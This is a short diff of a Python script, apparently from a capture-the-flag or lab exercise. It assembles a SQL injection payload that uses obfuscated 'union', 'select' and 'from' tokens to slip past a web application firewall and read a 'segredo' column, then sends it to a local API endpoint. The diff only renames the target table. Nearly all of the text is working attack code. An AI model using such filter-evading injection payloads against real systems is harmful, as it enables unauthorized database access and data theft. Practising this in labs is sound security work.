@@ -16,7 +16,7 @@ print(f"union  bypass: {union}")
 print(f"select bypass: {select}")
 print(f"from   bypass: {frm}")
 
-payload = f"-1 {union} {select} segredo {frm} palavras_chave"
+payload = f"-1 {union} {select} segredo {frm} waf_palavras_chave"
 print(f"\nPayload: {payload}\n")
 
 r = requests.get('http://localhost/api/waf', params={'search': payload})
